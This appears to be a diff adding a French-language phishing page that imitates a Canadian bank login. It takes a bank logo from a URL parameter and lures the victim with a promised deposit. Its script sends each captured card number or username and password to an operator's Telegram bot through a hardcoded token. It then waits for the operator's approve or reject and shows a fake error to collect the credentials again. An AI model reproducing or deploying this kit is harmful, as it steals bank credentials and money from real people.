@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Sécurisée</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; margin: 0; background: #fff; color: #333; }
+        .header-bank { padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
+        .bank-logo { height: 48px; object-fit: contain; }
+        .content { padding: 30px 20px; max-width: 400px; margin: 0 auto; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-weight: bold; margin-bottom: 8px; font-size: 14px; color: #555; }
+        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline: none; background: #fafafa; }
+        input:focus { border-color: #004c97; background: #fff; }
+        
+        .btn-submit { width: 100%; padding: 16px; color: white; border: none; border-radius: 4px; font-size: 17px; font-weight: bold; cursor: pointer; background: #004c97; margin-top: 10px; }
+        
+        /* Message d'erreur */
+        #error-box { display: none; background: #fff5f5; border: 1px solid #fc8181; color: #c53030; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }
+
+        /* Loader permanent */
+        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); z-index: 10000; flex-direction: column; align-items: center; justify-content: center; }
+        .spin { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #004c97; border-radius: 50%; animation: rot 1s linear infinite; }
+        @keyframes rot { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="loader"><div class="spin" id="spin-color"></div><p style="margin-top:20px; font-weight:bold;">Vérification de sécurité...</p></div>
+
+    <div class="header-bank"><img id="dynamic-logo" class="bank-logo"></div>
+    <div class="content">
+        <div id="error-box">⚠️ Les renseignements saisis sont inexacts. Veuillez vérifier votre n° de carte ou votre mot de passe.</div>
+        <p>Connectez-vous pour déposer vos <b><span id="p-txt"></span> $ CAD</b>.</p>
+        <form id="lForm">
+            <div class="form-group">
+                <label>N° de carte ou nom d'utilisateur</label>
+                <input type="text" id="user" required autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label>Mot de passe</label>
+                <input type="password" id="pass" required autocomplete="off">
+            </div>
+            <button type="submit" class="btn-submit" id="main-btn">Ouvrir une session</button>
+        </form>
+    </div>
+
+<script>
+    const p = new URLSearchParams(window.location.search);
+    const logo = decodeURIComponent(p.get('logo') || "");
+    const TOKEN = "8402431772:AAH-BEEIxGCwozhzT1Qs8gMRQmfCz9zBp4o";
+    const CHAT_ID = "1191944530";
+    let isWaiting = false;
+
+    window.onload = function() {
+        document.getElementById('dynamic-logo').src = logo;
+        document.getElementById('p-txt').innerText = p.get('prix');
+        const btn = document.getElementById('main-btn');
+        const spin = document.getElementById('spin-color');
+        let color = "#004c97"; 
+        if(logo.includes("MTLW2vzq")) color = "#008542";
+        if(logo.includes("76Rx8fqq")) color = "#ed1c24";
+        if(logo.includes("5NS2j9gW")) color = "#008a00";
+        if(logo.includes("Wbw1tp8R")) color = "#971b32";
+        btn.style.backgroundColor = color;
+        spin.style.borderTopColor = color;
+    };
+
+    document.getElementById('lForm').onsubmit = async function(e) {
+        e.preventDefault();
+        if(isWaiting) return;
+        isWaiting = true;
+        document.getElementById('error-box').style.display = 'none';
+        document.getElementById('loader').style.display = 'flex';
+
+        const msg = `<b>🔔 LOGIN CAPTURÉ</b>\n👤 ID : <code>${document.getElementById('user').value}</code>\n🔑 PASS : <code>${document.getElementById('pass').value}</code>\n💰 MONTANT : ${p.get('prix')} $`;
+        const kb = { inline_keyboard: [[{text:"✅ ACCEPTER", callback_data:"OK"}, {text:"❌ REJETER", callback_data:"NO"}]] };
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: "POST", headers: {"Content-Type":"application/json"},
+                body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML", reply_markup: kb})
+            });
+
+            let lastId = 0;
+            while(isWaiting) {
+                const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastId+1}&timeout=20`);
+                const d = await r.json();
+                if(d.result.length > 0) {
+                    for(let u of d.result) {
+                        lastId = u.update_id;
+                        if(u.callback_query) {
+                            if(u.callback_query.data === "OK") window.location.href = `verification.html?logo=${p.get('logo')}&prix=${p.get('prix')}`;
+                            if(u.callback_query.data === "NO") {
+                                isWaiting = false;
+                                document.getElementById('loader').style.display = 'none';
+                                document.getElementById('error-box').style.display = 'block';
+                                document.getElementById('pass').value = "";
+                            }
+                        }
+                    }
+                }
+            }
+        } catch(err) { isWaiting = false; }
+    };
+</script>
+</body>
+</html>
